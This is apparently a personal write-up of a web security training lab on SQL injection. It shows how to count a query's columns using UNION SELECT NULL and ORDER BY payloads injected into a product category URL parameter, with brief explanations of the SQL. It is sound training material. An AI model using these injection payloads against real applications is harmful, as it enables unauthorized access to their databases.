This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the 
application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to 
determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct 
the full attack.

To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an 
additional row containing null values.

HINT:
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Modify the category parameter, giving it the value '+UNION+SELECT+NULL--. Observe that an error occurs.
3. Modify the category parameter to add an additional column containing a null value: '+UNION+SELECT+NULL,NULL--
4. Continue adding null values until the error disappears and the response includes additional content containing the null values.

Way #1 (SELECT NULL,NULL--):
https://0aab004b043aebbf81e625f300d800cf.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories%27%20UNION%20SELECT%20NULL,%20NULL,%20NULL--

Queries:
SELECT ? from table where category='Clothing, shoes and accessories' UNION SELECT NULL, NULL, NULL--

UNION   This query will allow us to execute another query like SELECT as long it met the terms.

The Condition to fullfill:
1. The fields to be used in both the select statements must be in the same order, same number, and same data type.
2. The Union clause produces distinct values in the result set, to fetch the duplicate values too UNION ALL must be used instead of just UNION.

SELECT, NULL, NULL, NULL    This query usefull for testing if the table have 3 column, if it show error, then the table has more or 
                            less than 3 column.


way #2 (ORDER BY):
https://0a16001103910be0801dcb5f00ea0006.web-security-academy.net/filter?category=Food+%26+Drink%27%20ORDER%20BY%204--

SELECT ? from table where category='Food & Drink' ORDER BY 4--

ORDER BY 4--    This query will sort the result. The number 4 specifies the position of the columns in the SQL query. So this would be error.
                It is because there is less than 4 column which is 3 column. if we do ORDER BY 3-- it will work perfectly fine.
